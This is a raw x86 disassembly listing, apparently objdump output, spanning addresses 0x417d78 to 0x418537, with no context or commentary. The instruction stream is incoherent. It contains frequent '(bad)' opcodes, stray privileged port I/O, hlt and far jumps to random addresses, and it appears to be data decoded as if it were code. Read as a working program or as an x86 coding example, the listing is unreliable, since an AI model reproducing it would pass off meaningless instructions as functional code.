  417d78:	sub    eax,0x1d33b23f
  417d7d:	adc    DWORD PTR [edx],esi
  417d7f:	dec    eax
  417d80:	pop    esi
  417d81:	sub    al,0xb1
  417d83:	outs   dx,DWORD PTR ds:[esi]
  417d84:	dec    ecx
  417d85:	sbb    cl,ah
  417d87:	mov    esi,0x14cccdc9
  417d8c:	xchg   edi,eax
  417d8d:	cmp    bh,BYTE PTR [ecx-0x648b847f]
  417d93:	mov    edx,0x71509191
  417d98:	ins    DWORD PTR es:[edi],dx
  417d99:	adc    eax,ebx
  417d9b:	sbb    esp,eax
  417d9d:	sub    eax,0xcbeaf939
  417da2:	popf   
  417da3:	leave  
  417da4:	stos   BYTE PTR es:[edi],al
  417da5:	jno    0x417d93
  417da7:	sub    dl,ah
  417da9:	xor    ecx,edi
  417dab:	les    ecx,FWORD PTR [esi]
  417dad:	xor    BYTE PTR [ebp+0x7013427],dh
  417db3:	ins    DWORD PTR es:[edi],dx
  417db4:	inc    ecx
  417db5:	das    
  417db6:	push   ecx
  417db7:	lods   eax,DWORD PTR ds:[esi]
  417db8:	mov    bh,0xb9
  417dba:	hlt    
  417dbb:	xor    al,0x6a
  417dbd:	xor    ebx,DWORD PTR [edi-0x58]
  417dc0:	jge    0x417e2f
  417dc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417dc3:	pop    esi
  417dc4:	sub    cl,bh
  417dc6:	push   edi
  417dc7:	mov    BYTE PTR [ecx-0x79d4acb2],al
  417dcd:	jmp    0x3338e2
  417dd2:	adc    BYTE PTR [edi+0x76],bh
  417dd5:	pop    ebp
  417dd6:	pop    es
  417dd7:	sar    DWORD PTR [ebp-0x43288a5d],0xe6
  417dde:	icebp  
  417ddf:	xchg   BYTE PTR [ebx],bh
  417de1:	jne    0x417dd0
  417de3:	add    al,ch
  417de5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417de6:	or     DWORD PTR [edx-0xba22513],esi
  417dec:	add    dh,dl
  417dee:	add    ebp,DWORD PTR [eax-0x1c]
  417df1:	int3   
  417df2:	adc    eax,0xb1057033
  417df7:	xchg   ecx,eax
  417df8:	jae    0x417e31
  417dfa:	retf   0xbb5d
  417dfd:	xor    dh,BYTE PTR [ebx-0x13]
  417e00:	jle    0x417e7d
  417e02:	mov    BYTE PTR [eax-0x7b],cl
  417e05:	pop    esp
  417e06:	dec    ecx
  417e07:	fwait
  417e08:	mov    ecx,DWORD PTR ds:0xa3a3d00b
  417e0e:	sbb    dl,al
  417e10:	cmp    al,0x37
  417e12:	test   eax,0x61a03be2
  417e17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e18:	leave  
  417e19:	and    al,0x1d
  417e1b:	fistp  DWORD PTR [edi-0x4c94f33f]
  417e21:	mov    ds,WORD PTR [ecx]
  417e23:	mov    eax,0xc3c8f8dc
  417e28:	test   DWORD PTR [ecx+0x6fcba94c],edi
  417e2e:	or     al,BYTE PTR [edx]
  417e30:	in     eax,dx
  417e31:	stos   DWORD PTR es:[edi],eax
  417e32:	inc    edx
  417e33:	push   ebx
  417e34:	adc    al,0xd6
  417e36:	jb     0x417e89
  417e38:	dec    edi
  417e39:	or     eax,0x19414d54
  417e3e:	test   DWORD PTR [edi+0x634fa27b],edi
  417e44:	dec    esi
  417e45:	(bad)  
  417e46:	inc    BYTE PTR [eax-0x24bd5395]
  417e4c:	xchg   edx,eax
  417e4d:	pop    edx
  417e4e:	mov    eax,0x7ea38264
  417e53:	test   eax,0x4ed05d5c
  417e58:	mov    eax,0xa2e22f32
  417e5d:	int    0x29
  417e5f:	call   FWORD PTR [esi+0x6c0886e]
  417e65:	outs   dx,DWORD PTR ds:[esi]
  417e66:	cdq    
  417e67:	leave  
  417e68:	mov    ebp,0xc3544716
  417e6d:	cmp    al,0x2b
  417e6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e70:	outs   dx,DWORD PTR ds:[esi]
  417e71:	pop    es
  417e72:	cdq    
  417e73:	stos   DWORD PTR es:[edi],eax
  417e74:	jne    0x417e2a
  417e76:	xor    eax,0x98cbc6e4
  417e7b:	adc    esp,DWORD PTR [ebx]
  417e7d:	sub    DWORD PTR [ecx+0x77],ecx
  417e80:	inc    ecx
  417e81:	cmp    edi,DWORD PTR [eax+0x46486592]
  417e87:	mov    ah,BYTE PTR [ebx+0x293a5721]
  417e8d:	shr    DWORD PTR [eax],0x36
  417e90:	pop    edx
  417e91:	or     DWORD PTR [esi],edx
  417e93:	pop    esi
  417e94:	scas   al,BYTE PTR es:[edi]
  417e95:	push   0xffffff94
  417e97:	mov    ebp,ds
  417e99:	loopne 0x417e2f
  417e9b:	inc    esp
  417e9c:	stc    
  417e9d:	idiv   al
  417e9f:	in     al,0x48
  417ea1:	jmp    0x10d2ff1d
  417ea6:	and    al,0x7b
  417ea8:	pushf  
  417ea9:	and    bh,BYTE PTR [ebp-0x62aadb2b]
  417eaf:	mov    al,ds:0xa330253f
  417eb4:	jo     0x417eb5
  417eb6:	cdq    
  417eb7:	rcr    dh,1
  417eb9:	xchg   ebx,eax
  417eba:	fs sbb eax,0xf81a738b
  417ec0:	fwait
  417ec1:	(bad)  
  417ec2:	sub    edx,DWORD PTR ds:0x57fc7d36
  417ec8:	mov    DWORD PTR [ecx+ecx*4],esp
  417ecb:	inc    esi
  417ecc:	push   esp
  417ecd:	sbb    DWORD PTR [ebp-0x6c1e744d],ebx
  417ed3:	add    al,0xbc
  417ed5:	add    BYTE PTR [ebx],bl
  417ed7:	inc    edx
  417ed8:	pop    eax
  417ed9:	sub    bh,BYTE PTR [ebp-0x186f2139]
  417edf:	jnp    0x417e6d
  417ee1:	pop    es
  417ee2:	outs   dx,DWORD PTR ds:[esi]
  417ee3:	fistp  DWORD PTR [edi-0x5ab8546]
  417ee9:	xor    esi,esi
  417eeb:	push   ecx
  417eec:	cmp    ebx,ecx
  417eee:	lahf   
  417eef:	mov    ah,0x15
  417ef1:	lds    edi,FWORD PTR [esi+0x38]
  417ef4:	jmp    0xfe0d:0xf33598dd
  417efb:	pop    es
  417efc:	and    bh,ch
  417efe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417eff:	adc    bh,BYTE PTR [ebx+esi*8]
  417f02:	test   eax,0x1b31829f
  417f07:	mov    edx,0xb324d0c
  417f0c:	sbb    ecx,DWORD PTR [esi-0x6f]
  417f0f:	xchg   esi,eax
  417f10:	jo     0x417f66
  417f12:	dec    ebx
  417f13:	add    al,0xd7
  417f15:	adc    al,0x81
  417f17:	add    eax,0x7463ddd6
  417f1c:	fwait
  417f1d:	jle    0x417eea
  417f1f:	into   
  417f20:	push   ds
  417f21:	xchg   esi,eax
  417f22:	add    BYTE PTR [ecx+0x58233a42],ch
  417f28:	loop   0x417f42
  417f2a:	push   ds
  417f2b:	jnp    0x417ee1
  417f2d:	jno    0x417f9d
  417f2f:	pop    edx
  417f30:	bnd jmp 0x1adc0f6e
  417f36:	rcr    DWORD PTR [eax],cl
  417f38:	sbb    eax,0x5867690a
  417f3d:	bound  eax,QWORD PTR [edi+0xf1f3ce]
  417f43:	das    
  417f44:	or     dh,BYTE PTR [esi+0x25]
  417f47:	or     cl,BYTE PTR [esi+0x4c1b1134]
  417f4d:	shl    BYTE PTR [esi+0x40],cl
  417f50:	sub    DWORD PTR [edi],0x33bda4c7
  417f56:	shl    DWORD PTR [ebx],cl
  417f58:	ror    ecx,1
  417f5a:	mov    cl,0x61
  417f5c:	shr    DWORD PTR [ecx],cl
  417f5e:	push   ss
  417f5f:	(bad)  
  417f60:	mov    ch,0x33
  417f62:	mov    cl,dh
  417f64:	repnz adc BYTE PTR gs:[ebx+ebx*2],0xd9
  417f6a:	out    0x44,al
  417f6c:	repz xchg edi,eax
  417f6e:	or     BYTE PTR [edx],dl
  417f70:	mov    dl,0xb7
  417f72:	push   0xa06839f3
  417f77:	not    dh
  417f79:	in     eax,0x2a
  417f7b:	in     al,dx
  417f7c:	neg    edx
  417f7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f7f:	rol    BYTE PTR [ebp-0x16],cl
  417f82:	ds dec eax
  417f84:	inc    ebx
  417f85:	aam    0x65
  417f87:	push   es
  417f88:	sbb    bl,ch
  417f8a:	shl    dh,cl
  417f8c:	(bad)  
  417f8d:	inc    eax
  417f8e:	push   es
  417f8f:	fwait
  417f90:	les    edx,FWORD PTR [edi-0x53]
  417f93:	test   eax,0x87051a8a
  417f98:	push   DWORD PTR [edi+0x73d4a641]
  417f9e:	or     BYTE PTR [eax+ebx*1-0x25e7e5ae],0xe7
  417fa6:	sub    al,0x99
  417fa8:	mov    ch,0x85
  417faa:	sbb    esi,esi
  417fac:	jmp    0x417ff7
  417fae:	pop    ebp
  417faf:	scas   al,BYTE PTR es:[edi]
  417fb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417fb1:	repz fsubr DWORD PTR [edi+0x623c980f]
  417fb8:	and    BYTE PTR [ebp-0x7a],cl
  417fbb:	dec    ecx
  417fbc:	push   ebp
  417fbd:	sbb    eax,0xf5b475cd
  417fc2:	push   ebx
  417fc3:	and    DWORD PTR [ebx+0x4],esi
  417fc6:	push   edi
  417fc7:	rcr    BYTE PTR [edi-0xd],1
  417fca:	out    0xfb,al
  417fcc:	(bad)  
  417fcd:	xchg   ebx,eax
  417fce:	cli    
  417fcf:	and    ebp,edi
  417fd1:	lds    ebx,FWORD PTR [edx+0x37]
  417fd4:	in     eax,0x9b
  417fd6:	lock (bad) 
  417fd8:	std    
  417fd9:	retf   0xd90e
  417fdc:	pop    ds
  417fdd:	pop    ebp
  417fde:	xor    edx,DWORD PTR [edx+0x5c34fc24]
  417fe4:	jl     0x417f78
  417fe6:	sub    BYTE PTR [edx+0x0],bh
  417fe9:	jmp    0x6192831c
  417fee:	xor    BYTE PTR [ebx-0x9],0x2a
  417ff2:	jmp    0xa617:0xe39e770b
  417ff9:	scas   al,BYTE PTR es:[edi]
  417ffa:	xor    cl,BYTE PTR [ebp-0x4e]
  417ffd:	inc    ebp
  417ffe:	stos   BYTE PTR es:[edi],al
  417fff:	jl     0x417ffc
  418001:	fidiv  DWORD PTR [esi-0x7f75a702]
  418007:	jmp    0x417fa2
  418009:	push   esp
  41800a:	xchg   bp,ax
  41800c:	xchg   BYTE PTR [esp+eax*4+0x43e1aa36],bl
  418013:	nop
  418014:	pushf  
  418015:	xchg   esp,eax
  418016:	xchg   edi,eax
  418017:	scas   al,BYTE PTR es:[edi]
  418018:	or     BYTE PTR [edx],0xd7
  41801b:	pop    es
  41801c:	lods   eax,DWORD PTR ds:[esi]
  41801d:	sub    al,0x3f
  41801f:	add    DWORD PTR [esi-0x5a5586d4],0xffffffca
  418026:	lds    edx,FWORD PTR [ebp-0x4fd4a265]
  41802c:	div    ebx
  41802e:	repz scas eax,DWORD PTR es:[edi]
  418030:	jae    0x418094
  418032:	xor    al,0xda
  418034:	push   ecx
  418035:	mov    edi,0xd10bc5d3
  41803a:	call   0xf2cbc57
  41803f:	(bad)  
  418040:	mov    edi,DWORD PTR [ebp-0x1bb5492c]
  418046:	rcr    BYTE PTR [ebx+0x16],cl
  418049:	mov    ch,0x5e
  41804b:	nop
  41804c:	int3   
  41804d:	fwait
  41804e:	mov    DWORD PTR [ebp+0x209fdcaa],edx
  418054:	aaa    
  418055:	or     al,BYTE PTR [ecx+eax*8]
  418058:	dec    ebp
  418059:	xor    BYTE PTR [ecx+0x74],0xb2
  41805d:	iret   
  41805e:	jno    0x417fef
  418060:	cmp    al,0x1b
  418062:	std    
  418063:	mov    ds:0x9dd81091,al
  418068:	(bad)  
  418069:	retf   0x34aa
  41806c:	add    eax,0x461abe3c
  418071:	adc    al,0xb
  418073:	jne    0x418067
  418075:	xor    ebx,DWORD PTR [ebx-0x3c]
  418078:	mov    edx,0x25ba6803
  41807d:	ja     0x4180d8
  41807f:	inc    edi
  418080:	mov    bl,0x16
  418082:	dec    eax
  418083:	shl    BYTE PTR [edx+0x27],cl
  418086:	mov    esp,0xcd7e8fb2
  41808b:	ins    BYTE PTR es:[edi],dx
  41808c:	cli    
  41808d:	cbw    
  41808f:	cmp    al,0x28
  418091:	jb     0x418097
  418093:	lahf   
  418094:	xor    esp,DWORD PTR [edx-0x2fb4d871]
  41809a:	fwait
  41809b:	mov    edi,0x8aca58e4
  4180a0:	xor    eax,0x299d1e0a
  4180a5:	leave  
  4180a6:	xchg   ecx,eax
  4180a7:	dec    eax
  4180a8:	ret    0x24ee
  4180ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4180ac:	inc    eax
  4180ad:	cs xchg ebx,ebx
  4180b0:	mov    gs,WORD PTR [edi-0x49]
  4180b3:	inc    edx
  4180b4:	imul   DWORD PTR fs:[edi+0x27763c38]
  4180bb:	push   ds
  4180bc:	retf   0xf07c
  4180bf:	add    bh,ah
  4180c1:	mov    BYTE PTR [edi+ebx*2+0x520d8c6b],al
  4180c8:	sub    DWORD PTR [edi+edx*8+0x252838bc],edi
  4180cf:	push   edx
  4180d0:	xchg   al,bh
  4180d2:	bnd jp 0x418072
  4180d5:	inc    esi
  4180d6:	adc    edi,DWORD PTR [ebp-0x7e7afbfd]
  4180dc:	div    DWORD PTR [edx+eiz*2]
  4180df:	in     al,0xa5
  4180e1:	push   ebp
  4180e2:	popf   
  4180e3:	and    DWORD PTR [ecx],esi
  4180e5:	cdq    
  4180e6:	pop    esi
  4180e7:	add    al,0x2a
  4180e9:	scas   ax,WORD PTR es:[edi]
  4180eb:	out    0xce,al
  4180ed:	addr16 xchg esi,eax
  4180ef:	pop    edx
  4180f0:	xor    DWORD PTR [eax-0x10ed7976],edx
  4180f6:	mov    dh,0xf3
  4180f8:	gs pop edi
  4180fa:	clc    
  4180fb:	std    
  4180fc:	lods   eax,DWORD PTR ds:[esi]
  4180fd:	sub    edx,esp
  4180ff:	test   eax,esp
  418101:	es ss lahf 
  418104:	cmp    bl,dh
  418106:	pop    eax
  418107:	cmp    BYTE PTR [ebx],bh
  418109:	cmc    
  41810a:	mov    dl,0x6b
  41810c:	xlat   BYTE PTR ds:[ebx]
  41810d:	mov    esi,0xa3b78866
  418112:	js     0x41813e
  418114:	call   0x49f7:0x98f14a90
  41811b:	shl    ebp,1
  41811d:	retf   
  41811e:	cmp    bh,BYTE PTR [ecx+0x65]
  418121:	ds inc esp
  418123:	(bad)  
  418124:	in     al,0xb5
  418126:	adc    dh,BYTE PTR [ebx+0x243b7677]
  41812c:	mov    ch,0xd0
  41812e:	arpl   WORD PTR [esi-0xb],bp
  418131:	fisub  DWORD PTR ds:0x5df24cd3
  418137:	mov    bl,bh
  418139:	ins    BYTE PTR es:[edi],dx
  41813a:	sub    al,0xdd
  41813c:	sar    al,0xf3
  41813f:	imul   ax,WORD PTR [ebx-0x48f8dd1],0xffe1
  418147:	mov    bh,0x8d
  418149:	cwde   
  41814a:	mov    ah,dh
  41814c:	sbb    dl,ah
  41814e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41814f:	push   eax
  418150:	cmp    BYTE PTR [ebx-0x43aaae4b],cl
  418156:	mov    ebx,DWORD PTR [ecx]
  418158:	jmp    0xe823e2af
  41815d:	cs (bad) 
  41815f:	sbb    eax,0x45403bc
  418164:	pmullw mm2,QWORD PTR [edi]
  418167:	and    edi,eax
  418169:	in     al,dx
  41816a:	pop    ecx
  41816b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41816c:	pushf  
  41816d:	add    DWORD PTR [edx],0xffffffb2
  418170:	and    al,0x12
  418172:	popa   
  418173:	dec    esp
  418174:	and    DWORD PTR [edi+0x136897be],ebx
  41817a:	cmp    ecx,DWORD PTR [eax-0x4d]
  41817d:	stc    
  41817e:	(bad)  
  41817f:	and    esp,esi
  418181:	jo     0x41814e
  418183:	push   es
  418184:	and    esi,ebx
  418186:	or     ebx,esp
  418188:	jb     0x418136
  41818a:	dec    edx
  41818b:	push   ds
  41818c:	adc    bh,ch
  41818e:	cld    
  41818f:	dec    ebx
  418190:	dec    ecx
  418191:	daa    
  418192:	in     eax,0x9e
  418194:	scas   al,BYTE PTR es:[edi]
  418195:	dec    ebx
  418196:	data16 test BYTE PTR [edx],al
  418199:	pop    ss
  41819a:	ds cld 
  41819c:	mov    bl,0x4e
  41819e:	popa   
  41819f:	call   0x5e558e56
  4181a4:	lods   al,BYTE PTR ds:[esi]
  4181a5:	out    0xdb,al
  4181a7:	pushf  
  4181a8:	nop
  4181a9:	fiadd  WORD PTR [ecx-0x68]
  4181ac:	xchg   ebp,eax
  4181ad:	xchg   esi,eax
  4181ae:	mov    cl,0x8
  4181b0:	adc    bh,BYTE PTR [esp+ebp*4-0x43ae06e2]
  4181b7:	xchg   DWORD PTR [eax-0x4c69514c],esi
  4181bd:	aad    0x22
  4181bf:	gs int3 
  4181c1:	cmp    DWORD PTR ds:0x3ea216dc,ebx
  4181c7:	fidivr DWORD PTR [ebx+0x3a]
  4181ca:	pop    ebp
  4181cb:	mov    al,ds:0x78a9334c
  4181d0:	fwait
  4181d1:	outs   dx,DWORD PTR ds:[esi]
  4181d2:	add    al,dl
  4181d4:	ins    DWORD PTR es:[edi],dx
  4181d5:	loop   0x4181e7
  4181d7:	pushf  
  4181d8:	cmc    
  4181d9:	xor    BYTE PTR ds:0x9beb9364,ah
  4181df:	mov    al,0x8
  4181e1:	or     edi,edi
  4181e3:	loopne 0x4181e8
  4181e5:	inc    ebx
  4181e6:	in     eax,0xf4
  4181e8:	inc    edi
  4181e9:	int    0xf8
  4181eb:	mov    cl,0x5d
  4181ed:	pop    ecx
  4181ee:	xchg   edi,eax
  4181ef:	(bad)  
  4181f0:	cmc    
  4181f1:	inc    eax
  4181f2:	xor    BYTE PTR [edi],ah
  4181f4:	mov    BYTE PTR [esi],al
  4181f6:	jo     0x4181bd
  4181f8:	addr16 retf 0x4ce2
  4181fc:	cmp    al,0x29
  4181fe:	icebp  
  4181ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418200:	pop    es
  418201:	aam    0x53
  418203:	pusha  
  418204:	push   ecx
  418205:	adc    eax,0x9764a07f
  41820a:	sti    
  41820b:	mov    dh,0xfc
  41820d:	aaa    
  41820e:	jns    0x4181c6
  418210:	out    0xe5,al
  418212:	and    edx,DWORD PTR [esi+ecx*1-0xa381d74]
  418219:	sbb    BYTE PTR [eax*8-0x12dd4494],cl
  418220:	mov    edi,0xace525b3
  418225:	pop    ss
  418226:	add    ah,bl
  418228:	and    bh,ah
  41822a:	out    dx,eax
  41822b:	mov    al,0x55
  41822d:	dec    ebp
  41822e:	mov    BYTE PTR [edi-0x70db46af],ah
  418234:	jb     0x41825f
  418236:	lods   al,BYTE PTR ds:[esi]
  418237:	call   0xe4f3364e
  41823c:	fbstp  TBYTE PTR [ecx]
  41823e:	adc    cl,0x11
  418241:	jno    0x41825e
  418243:	loope  0x4181e6
  418245:	hlt    
  418246:	mov    edx,0xd631f6b1
  41824b:	ins    DWORD PTR es:[edi],dx
  41824c:	push   eax
  41824d:	jnp    0x41822a
  41824f:	(bad)  
  418250:	arpl   WORD PTR [esi+0x3b],bx
  418253:	jae    0x4181da
  418255:	arpl   WORD PTR [edi-0x16247eb],cx
  41825b:	cwde   
  41825c:	dec    edx
  41825d:	or     eax,0xbcc268c4
  418262:	mov    BYTE PTR [edx-0x2cd1d80e],bl
  418268:	mov    ch,0x87
  41826a:	mov    al,ds:0x7885ade2
  41826f:	leave  
  418270:	js     0x4182c2
  418272:	call   0xd922fe4a
  418277:	cli    
  418278:	mov    esp,0x455d32af
  41827d:	outs   dx,BYTE PTR ds:[esi]
  41827e:	adc    al,0xd3
  418280:	xchg   edx,eax
  418281:	sub    edi,edx
  418283:	es into 
  418285:	push   0x8483b1c7
  41828a:	fwait
  41828b:	add    ebp,esi
  41828d:	adc    eax,0x4039fbb9
  418292:	mov    ebp,DWORD PTR [ebp-0xdfec9ea]
  418298:	mov    ebp,0x47e8016c
  41829d:	test   DWORD PTR [edi-0x28fb24e1],eax
  4182a3:	add    dh,BYTE PTR [edx+0x51]
  4182a6:	call   0xa62551e3
  4182ab:	gs fwait
  4182ad:	pop    ss
  4182ae:	push   0xffffffb7
  4182b0:	shl    BYTE PTR [ecx-0x10928530],1
  4182b6:	in     eax,0x63
  4182b8:	mov    eax,ds:0xc5efc37f
  4182bd:	pop    ebx
  4182be:	pop    es
  4182bf:	push   eax
  4182c0:	and    BYTE PTR ds:[edi*2-0x30c9ac63],al
  4182c8:	fwait
  4182c9:	add    DWORD PTR [ebp+0x1e],ecx
  4182cc:	dec    ecx
  4182cd:	or     al,0x62
  4182cf:	push   cs
  4182d0:	pop    ebx
  4182d1:	imul   esp,DWORD PTR [ebp+0x52],0xffffffcb
  4182d5:	add    al,0x4a
  4182d7:	adc    eax,0x6d214575
  4182dc:	jg     0x418325
  4182de:	jns    0x418307
  4182e0:	push   0xffffffa1
  4182e2:	(bad)  
  4182e4:	jmp    0x4182e7
  4182e6:	pop    esi
  4182e7:	not    BYTE PTR [edi+0x6f]
  4182ea:	fmul   DWORD PTR [ecx]
  4182ec:	mov    al,ds:0xee273d20
  4182f1:	xor    al,0xf6
  4182f3:	sar    DWORD PTR [esi],1
  4182f5:	(bad)  
  4182f6:	imul   BYTE PTR [ebp-0x36]
  4182f9:	shr    ch,0xb6
  4182fc:	mov    bl,0x1b
  4182fe:	scas   al,BYTE PTR es:[edi]
  4182ff:	stc    
  418300:	aas    
  418301:	mov    dl,0xda
  418303:	inc    ebx
  418304:	test   eax,0x7bf55328
  418309:	jecxz  0x41833c
  41830b:	popf   
  41830c:	jns    0x41830a
  41830e:	jae    0x418304
  418310:	jecxz  0x418359
  418312:	and    cl,BYTE PTR [ecx+0x1b]
  418315:	xchg   ebp,eax
  418316:	inc    ebx
  418317:	lods   al,BYTE PTR ds:[esi]
  418318:	add    edi,DWORD PTR [edx]
  41831a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41831b:	cmp    DWORD PTR [esi+0x51a62a04],esp
  418321:	sbb    BYTE PTR [ebx-0x6],cl
  418324:	xchg   ebp,eax
  418325:	scas   al,BYTE PTR es:[edi]
  418326:	and    eax,0x8de43e
  41832b:	mov    bl,0xb
  41832d:	stos   BYTE PTR es:[edi],al
  41832e:	call   0x8fb7de72
  418333:	jle    0x4182e6
  418335:	bound  esp,QWORD PTR [edi-0x6daf1443]
  41833b:	pop    es
  41833c:	lods   al,BYTE PTR ds:[esi]
  41833d:	dec    esi
  41833e:	sar    BYTE PTR [ebx-0x80],1
  418341:	sub    BYTE PTR [edx+0x113147f6],dl
  418347:	addr16 xor eax,0x3166d03
  41834d:	cli    
  41834e:	push   es
  41834f:	lock int3 
  418351:	mov    bl,bh
  418353:	jp     0x41838b
  418355:	xchg   edx,eax
  418356:	dec    edx
  418357:	xchg   ecx,eax
  418358:	enter  0x72b7,0xc9
  41835c:	push   eax
  41835d:	shl    BYTE PTR [ebx+esi*1+0x5b],0x3a
  418362:	push   edx
  418363:	ss push edi
  418365:	icebp  
  418366:	ss cs iret 
  418369:	mov    edx,0xfee960a6
  41836e:	pop    edx
  41836f:	bound  edx,QWORD PTR [edi]
  418371:	mov    DWORD PTR [esi],eax
  418373:	mov    edx,0x325b87c1
  418379:	repnz sti 
  41837b:	and    BYTE PTR [esi-0x32981eba],dl
  418381:	jnp    0x4183ca
  418383:	inc    esi
  418384:	ins    DWORD PTR es:[edi],dx
  418385:	mov    DWORD PTR [ebp+0x48858c2e],ebx
  41838b:	aad    0x74
  41838d:	mov    dh,0xb2
  41838f:	fdiv   st,st(4)
  418391:	jbe    0x418376
  418393:	jnp    0x41838f
  418395:	inc    edi
  418396:	mov    ds:0xc1f01da2,al
  41839b:	mov    ds:0xbfa8f3f,eax
  4183a0:	mov    ds:0x8f947046,al
  4183a5:	rol    BYTE PTR [eax+0x34],cl
  4183a8:	dec    edi
  4183a9:	push   0x35de058d
  4183ae:	mov    WORD PTR [ecx-0x5c],ss
  4183b1:	jns    0x4183f6
  4183b3:	addr16 lahf 
  4183b5:	inc    DWORD PTR [ecx-0x56]
  4183b8:	sar    DWORD PTR [eax+0x58],cl
  4183bb:	mov    edx,0x356284a0
  4183c0:	popa   
  4183c1:	push   0xffffffd9
  4183c3:	lock mov al,ds:0x69548be2
  4183c9:	cmp    al,0x78
  4183cb:	dec    edx
  4183cc:	jl     0x4183f1
  4183ce:	iret   
  4183cf:	in     al,dx
  4183d0:	fild   WORD PTR [ebp+0x20b86e07]
  4183d6:	cmp    cl,BYTE PTR [edi+0x35f38abc]
  4183dc:	push   0x1e039f41
  4183e1:	mov    ah,0x9f
  4183e3:	loop   0x4183c7
  4183e5:	test   BYTE PTR [eax+eax*4+0x521b619],al
  4183ec:	js     0x41840a
  4183ee:	sbb    BYTE PTR [ecx],cl
  4183f0:	hlt    
  4183f1:	loope  0x4183d2
  4183f3:	test   DWORD PTR [esi],0xa6766292
  4183f9:	add    bl,0x75
  4183fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4183fd:	mov    eax,ss
  4183ff:	mov    al,0xe7
  418401:	retf   0x7949
  418404:	cmc    
  418405:	out    dx,eax
  418406:	pop    ebp
  418407:	out    dx,al
  418408:	sbb    ch,0x10
  41840b:	push   ss
  41840c:	cwde   
  41840d:	adc    edi,ecx
  41840f:	arpl   WORD PTR [ebx+0x3a336167],si
  418415:	sub    DWORD PTR ds:0x3b3e08c3,0x2a
  41841c:	test   eax,0x562b7739
  418421:	mov    cl,BYTE PTR [ecx+eax*1]
  418424:	loopne 0x4183ae
  418426:	xchg   BYTE PTR [esi-0x19040a8f],ah
  41842c:	xor    ebp,0xffffffa2
  41842f:	mov    dh,0xe7
  418431:	scas   eax,DWORD PTR es:[edi]
  418432:	or     eax,0x189623e1
  418437:	fs and eax,0x105f1d1
  41843d:	int3   
  41843e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41843f:	adc    BYTE PTR [edi+0x2d],0xf
  418443:	mov    eax,0x1a0d1aba
  418448:	push   edi
  418449:	icebp  
  41844a:	mov    ebp,0x86cc948f
  41844f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418450:	inc    BYTE PTR ds:0x38523343
  418456:	dec    ebx
  418457:	inc    esp
  418458:	dec    ebp
  418459:	add    esp,edx
  41845b:	fdecstp 
  41845d:	sub    eax,0xff7770fc
  418462:	test   DWORD PTR [ecx+0x45],eax
  418465:	out    dx,al
  418466:	dec    esp
  418467:	into   
  418468:	fisub  WORD PTR [ebx-0x1c0c5ddc]
  41846e:	clc    
  41846f:	test   ah,ch
  418471:	add    al,0x3a
  418473:	iret   
  418474:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418475:	test   al,0x82
  418477:	jmp    0x57d86cd3
  41847c:	in     al,0xfb
  41847e:	push   esi
  41847f:	lds    esp,FWORD PTR [ecx-0x4c]
  418482:	or     esp,esi
  418484:	inc    esp
  418485:	and    DWORD PTR [eax+eax*2],ebp
  418488:	xchg   ebx,esi
  41848a:	push   edi
  41848b:	test   DWORD PTR [ebx+0x32],esp
  41848e:	sbb    al,0x9f
  418490:	fwait
  418491:	xchg   esp,eax
  418492:	adc    DWORD PTR [ebp+0x3b],0xbe795478
  418499:	test   eax,0x5c276375
  41849e:	jbe    0x418469
  4184a0:	xor    edi,edi
  4184a2:	cli    
  4184a3:	fcompp 
  4184a5:	fist   DWORD PTR [edx+ebx*8+0x2c7d0c06]
  4184ac:	jbe    0x41842f
  4184ae:	jbe    0x4184cf
  4184b0:	push   edi
  4184b1:	xor    DWORD PTR [edi-0x20076ed2],esi
  4184b7:	inc    ebp
  4184b8:	push   ebp
  4184b9:	jecxz  0x41848b
  4184bb:	dec    DWORD PTR [edx]
  4184bd:	dec    eax
  4184be:	idiv   BYTE PTR [ebp+0x44]
  4184c1:	jno    0x418520
  4184c3:	leave  
  4184c4:	fst    st(1)
  4184c6:	ja     0x41850b
  4184c8:	stc    
  4184c9:	push   0x1a
  4184cb:	in     al,dx
  4184cc:	and    ecx,DWORD PTR [edx]
  4184ce:	xor    al,0x19
  4184d0:	jo     0x4184a0
  4184d2:	add    ah,0x40
  4184d5:	or     ch,0x97
  4184d8:	pop    ds
  4184d9:	je     0x418513
  4184db:	out    dx,eax
  4184dc:	stos   BYTE PTR es:[edi],al
  4184dd:	inc    edx
  4184de:	mov    cl,0xb6
  4184e0:	sahf   
  4184e1:	out    dx,eax
  4184e2:	aam    0xcb
  4184e4:	cmp    DWORD PTR ds:0xfed5eb30,edi
  4184ea:	jg     0x418568
  4184ec:	xchg   DWORD PTR ds:0xae82df05,esp
  4184f2:	dec    ecx
  4184f3:	ret    
  4184f4:	popa   
  4184f5:	(bad)  
  4184f7:	mov    si,0x3043
  4184fb:	mov    ch,0x8d
  4184fd:	mov    ch,0x8
  4184ff:	mov    edx,0xbd1a360d
  418504:	adc    al,0xeb
  418506:	daa    
  418507:	mov    bh,0x25
  418509:	aad    0x1f
  41850b:	pop    ds
  41850c:	test   al,0xa4
  41850e:	into   
  41850f:	shl    DWORD PTR [ebx+0x32],cl
  418512:	es dec eax
  418514:	int    0x91
  418516:	ror    cl,1
  418518:	lea    eax,[edx-0x5136fde7]
  41851e:	add    bh,BYTE PTR [ecx-0x531e97d6]
  418524:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418525:	ins    DWORD PTR es:[edi],dx
  418526:	pop    edx
  418527:	fs inc esi
  418529:	mov    cl,0xcc
  41852b:	sar    bh,cl
  41852d:	rcl    bl,1
  41852f:	das    
  418530:	or     ah,al
  418532:	mov    ds:0xe746ee9c,al
  418537:	mov    al,0x12
